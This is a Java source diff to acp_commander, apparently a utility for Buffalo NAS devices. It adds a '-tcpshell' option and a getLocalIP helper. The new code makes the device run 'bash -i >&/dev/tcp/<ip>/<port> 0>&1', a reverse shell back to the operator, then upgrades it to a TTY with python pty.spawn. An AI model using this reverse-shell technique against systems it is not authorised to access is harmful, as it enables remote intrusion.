@@ -16,6 +16,7 @@ import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.PrintWriter;
 
 import java.net.DatagramSocket;
 import java.net.InetAddress;
@@ -195,6 +196,17 @@ public class acp_commander {
     }
   }
 
+  private static String getLocalIP(String ipTarget) {
+    String output = String.valueOf("");
+    try(final DatagramSocket socket = new DatagramSocket()){
+      //try to open a connection to remote IP and record what local IP the OS uses for that connection
+      socket.connect(InetAddress.getByName(ipTarget), 10002);
+      output =  socket.getLocalAddress().getHostAddress();
+      socket.close();
+      } catch (java.io.IOException IOE) {System.out.println(IOE); System.exit( -1); }
+      return output;
+  }
+
   public static void main(String[] args) {
     _debug = _debug;
     _timeout = _timeout;
@@ -215,6 +227,7 @@ public class acp_commander {
     boolean _openbox = false;
     boolean _authent = false;
     boolean _shell = false;
+    boolean _tcpshell = false;
     boolean _clearboot = false;
     boolean _emmode = false; // next reboot into EM-Mode
     boolean _normmode = false; // next reboot into rootFS-Mode
@@ -312,6 +325,11 @@ public class acp_commander {
     if (hasParam("-s", args)) {
       _authent = true;
       _shell = true;
+    }
+
+    if (hasParam("-tcpshell", args)) {
+      _authent = true;
+      _tcpshell = true;
     }
 
     if (hasParam("-xfer", args)) {
@@ -735,6 +753,65 @@ public class acp_commander {
       } catch (java.io.IOException IOE) { }
     }
 
+    if (_tcpshell) {
+      BufferedReader in = null;
+      PrintWriter out = null;
+      BufferedReader stdIn = null;
+      ServerSocket serversocket = null;
+      Socket socket = null;
+
+      String magic = "python -c \'import pty; pty.spawn(\"/bin/bash\")\'";
+      String magic2 = "stty -echo";
+
+      try {
+        serversocket = new ServerSocket(0);
+        String localip = getLocalIP(_target);
+        int localport = serversocket.getLocalPort();
+        String startcmd = "bash -i >&/dev/tcp/" + localip + "/" + localport + " 0>&1 &";
+        myACP.command(startcmd);
+
+        socket = serversocket.accept();
+
+        in = new BufferedReader (new InputStreamReader (socket.getInputStream ()));
+        out = new PrintWriter (socket.getOutputStream(), true);
+        stdIn = new BufferedReader (new InputStreamReader(System.in));
+
+        //suppress first line (bash warning)
+        in.readLine();
+
+        //send commands to upgrade tty
+        out.println(magic);
+        out.println(magic2);
+
+        //supress output of those commands
+        in.readLine();
+        in.readLine();
+        in.readLine();
+
+        while(!socket.isClosed())
+        {
+          if (in.ready())
+          {
+            System.out.printf("%c",in.read());
+          }
+
+          if (stdIn.ready())
+          {
+            out.println(stdIn.readLine());
+          }
+          //detect disconnect by reading socket? what happens if not disconnected?
+          //sleep a few ms for sanity?
+       }
+
+       in.close();
+       out.close();
+       socket.close();
+       serversocket.close();
+
+     } catch (Exception e) { System.out.println(e);}
+
+   }
+
     if (hasParam("-xfer", args)) {
       outDebug("\n\nUsing parameter -xfer (file transfer)", 1);
       String output = String.valueOf("");
@@ -766,11 +843,7 @@ public class acp_commander {
       }
 
       //open a socket to target and record the local ip address the OS used
-      try(final DatagramSocket socket = new DatagramSocket()){
-      socket.connect(InetAddress.getByName(_target), 10002);
-      localip = socket.getLocalAddress().getHostAddress();
-      socket.close();
-      } catch (java.io.IOException IOE) {System.out.println(IOE); System.exit( -1); }
+      localip = getLocalIP(_target);
 
       //have socket find and test a port, then free it to attach the server to
       try {
